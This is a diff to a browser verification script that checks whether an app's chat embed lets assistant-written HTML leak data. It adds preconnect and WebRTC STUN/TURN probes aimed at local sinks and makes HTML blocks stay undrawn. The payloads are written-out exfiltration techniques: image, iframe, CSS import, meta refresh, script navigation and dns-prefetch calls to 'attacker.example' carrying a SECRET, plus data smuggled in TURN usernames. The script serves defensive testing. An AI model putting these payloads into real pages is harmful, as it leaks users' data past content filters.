@@ -5,8 +5,16 @@
  * in the REAL embed through the real gateway and spawn (a stand-in `claude`), in Chromium and, with
  * DC_VERIFY_ENGINE=webkit, in WebKit. Every request of every frame is counted; one that leaves for
  * a host other than this machine is a finding. A control from the app's own page proves the
- * counter sees a remote request when one happens. Each block must still DRAW: the gate may close
- * the way out, not the feature.
+ * counter sees a remote request when one happens.
+ *
+ * Two ways out are not HTTP requests and no route sees them: `<link rel=preconnect>` (a TCP
+ * connection, the data in the host name over DNS) and WebRTC (STUN/TURN packets, the data in the
+ * server address and the TURN username). Each payload aims them at a sink of this script's own, a
+ * TCP port and a UDP port; one connection or one packet there is a finding.
+ *
+ * An app chat draws no HTML the assistant wrote (owner, 2026-11-02): a `dream-html` block and a
+ * question's previews must NOT draw, the reader must see a notice where they would have been, and
+ * the question must still be answerable by its labels. Markdown, a board and a PDF still draw.
  *
  *   dreamcontext builder heavy --max-wait 1200 -- node scripts/verify/app-chat-exfil.mjs
  */
@@ -14,6 +22,9 @@ import { spawnSync } from 'node:child_process';
 import { chmodSync, mkdirSync, readFileSync, realpathSync, writeFileSync } from 'node:fs';
 import { dirname, join } from 'node:path';
 import { fileURLToPath } from 'node:url';
+import dgram from 'node:dgram';
+import net from 'node:net';
+import { networkInterfaces } from 'node:os';
 import { openApp } from './lib/app.mjs';
 
 const REPO = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
@@ -26,10 +37,29 @@ const cli = (...args) => {
 };
 
 const EVIL = 'attacker.example';
+// The non-HTTP sinks: a TCP port for preconnect, a UDP port for STUN/TURN. WebRTC is aimed at
+// this Mac's LAN address when it has one (a browser may skip a loopback ICE server).
+const tcpHits = [];
+const udpHits = [];
+const tcpSink = net.createServer((c) => { tcpHits.push(Date.now()); c.on('error', () => {}); c.destroy(); });
+await new Promise((r) => tcpSink.listen(0, '127.0.0.1', r));
+const TCP = tcpSink.address().port;
+const udpSink = dgram.createSocket('udp4');
+udpSink.on('message', (m) => udpHits.push(m.length));
+await new Promise((r) => udpSink.bind(0, '0.0.0.0', r));
+const UDP = udpSink.address().port;
+const LAN = Object.values(networkInterfaces()).flat().find((i) => i && i.family === 'IPv4' && !i.internal)?.address ?? '127.0.0.1';
+const quiet = (tag) => `<link rel="preconnect" href="http://127.0.0.1:${TCP}/${tag}">
+<link rel="dns-prefetch" href="http://${tag}-SECRET.${EVIL}">
+<script>
+try { const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:${LAN}:${UDP}' }, { urls: 'turn:${LAN}:${UDP}?transport=udp', username: '${tag}-SECRET', credential: 'x' }] });
+  pc.createDataChannel('d'); pc.createOffer().then((o) => pc.setLocalDescription(o)).catch(() => {}); } catch (e) {}
+</script>`;
 const NAV = `https://${EVIL}`;
 // Every way out a page can try without a click: a navigation of its own frame, a meta refresh, a
 // fetch, an image, a frame, a style import, a form, a beacon.
 const html = (tag) => `<p id="drawn-${tag}">drawn ${tag}</p>
+${quiet(tag)}
 <img src="${NAV}/${tag}-img?d=SECRET">
 <iframe src="${NAV}/${tag}-frame?d=SECRET"></iframe>
 <style>@import url(${NAV}/${tag}-css?d=SECRET);</style>
@@ -42,7 +72,7 @@ try { document.getElementById('f').submit(); } catch (e) {}
 </script>`;
 // Its own frame, sent elsewhere by script: a block of its own, so the one above stays to be seen.
 const nav = (tag) => `<p>nav ${tag}</p><script>setTimeout(() => { location.href = '${NAV}/${tag}-script-nav?d=SECRET'; }, 200);</script>`;
-const meta = (tag) => `<meta http-equiv="refresh" content="0;url=${NAV}/${tag}-refresh?d=SECRET"><p>refresh ${tag}</p>`;
+const meta = (tag) => `<meta http-equiv="refresh" content="0;url=${NAV}/${tag}-refresh?d=SECRET"><p>refresh ${tag}</p>${quiet(`${tag}-meta`)}`;
 
 const BOARD = `---
 excalidraw-plugin: parsed
@@ -192,20 +222,24 @@ try {
     await p.waitForTimeout(1200);
     const okImg = await f.locator('img[src*="ok.png"]').evaluateAll((els) => els.filter((e) => e.naturalWidth > 0).length);
     if (!okImg) app.findings.push('markdown: the local picture was dropped');
-    // dream-html: both blocks draw (their sandboxed frames hold text).
+    // dream-html: no block draws; each leaves the notice where it would have been.
     await send(f, 'HTML');
+    await waitText('Navigate:');
     await p.waitForTimeout(2500);
-    const htmlFrames = p.frames().filter((x) => x.url() === 'about:srcdoc');
     let drawn = 0;
-    for (const x of htmlFrames) if (await x.locator('#drawn-html').count().catch(() => 0)) drawn += 1;
-    if (!drawn) app.findings.push('dream-html: the block did not draw');
-    // Question previews: the tiles draw.
+    for (const x of p.frames().filter((y) => y.url() === 'about:srcdoc')) if (await x.locator('#drawn-html, p').count().catch(() => 0)) drawn += 1;
+    if (drawn) app.findings.push(`dream-html: ${drawn} block(s) drew in an app chat`);
+    const notices = await f.locator('[data-model-html-off]').count();
+    if (notices < 3) app.findings.push(`dream-html: ${notices} notice(s) for 3 blocks not drawn`);
+    // Question previews: no tile draws, the labels do, the card says why.
     await send(f, 'ASK');
     if (!await waitText('Which look?')) app.findings.push('question: the card did not draw');
     await p.waitForTimeout(2500);
     let tiles = 0;
-    for (const x of p.frames().filter((y) => y.url() === 'about:srcdoc')) if (await x.locator('#drawn-preview').count().catch(() => 0)) tiles += 1;
-    if (!tiles) app.findings.push('question: the preview did not draw');
+    for (const x of p.frames().filter((y) => y.url() === 'about:srcdoc')) if (await x.locator('#drawn-preview, p').count().catch(() => 0)) tiles += 1;
+    if (tiles) app.findings.push(`question: ${tiles} preview(s) drew in an app chat`);
+    if (!await f.locator('.chat-surveycard [data-model-html-off]').count()) app.findings.push('question: no notice that the previews were not drawn');
+    for (const l of ['Left', 'Right', 'Third']) if (!await f.getByText(l, { exact: true }).count()) app.findings.push(`question: the label ${l} is missing`);
     await f.getByText('Left', { exact: true }).first().click({ timeout: 5000 }).catch(() => {});
     await f.getByRole('button', { name: /^(Submit|Send|Done|Gönder|Bitir)/ }).first().click({ timeout: 3000 }).catch(() => app.findings.push('question: could not answer'));
     if (!await waitText('answer to', 8000)) app.findings.push('question: the answer did not land');
@@ -214,6 +248,8 @@ try {
     await p.waitForTimeout(4000);
     const canvas = await f.locator('canvas').count();
     if (!canvas) app.findings.push('board: the canvas did not draw');
+    const liveEmbed = await f.locator('iframe[src*="youtube"]').count();
+    if (liveEmbed) app.findings.push('board: the web embed drew a live frame');
     // PDF: the viewer opens.
     await send(f, 'PDF');
     await waitText('The handbook');
@@ -221,11 +257,16 @@ try {
     await chip.click({ timeout: 8000 }).catch(() => app.findings.push('pdf: no chip'));
     await p.waitForTimeout(3000);
     if (!await f.locator('.pdf-viewer-frame, .pdf-viewer-status').first().isVisible().catch(() => false)) app.findings.push('pdf: the viewer did not open');
-    console.log(`${engine}: dream-html frames ${drawn}, preview tiles ${tiles}, canvas ${canvas}, local picture ${okImg}`);
+    console.log(`${engine}: dream-html frames ${drawn}, notices ${notices}, preview tiles ${tiles}, canvas ${canvas}, live embeds ${liveEmbed}, local picture ${okImg}`);
     await p.waitForTimeout(1500);
   }, { name: 'exfil' });
 
   if (!control) app.findings.push('control: the counter never saw the remote request it was shown');
+  // Wait out a slow ICE gather before reading the sinks.
+  await new Promise((r) => setTimeout(r, 2000));
+  if (tcpHits.length) app.findings.push(`LEAK preconnect: ${tcpHits.length} TCP connection(s) reached the sink`);
+  if (udpHits.length) app.findings.push(`LEAK webrtc: ${udpHits.length} STUN/TURN packet(s) reached the sink`);
+  console.log(`${engine}: preconnect sink ${tcpHits.length} connection(s), webrtc sink ${udpHits.length} packet(s)`);
   for (const l of leaks) app.findings.push(`LEAK ${l}`);
   console.log(`${engine}: ${leaks.length} request(s) left the machine; control seen: ${control}; ${blocked.length} refusal(s) logged by the browser`);
   // The browser refusing a payload is the gate working, not a finding about the app.
@@ -239,5 +280,7 @@ try {
   app.findings.length = 0;
   app.findings.push(...new Set(keep));
 } finally {
+  tcpSink.close();
+  udpSink.close();
   process.exitCode = await app.finish();
 }
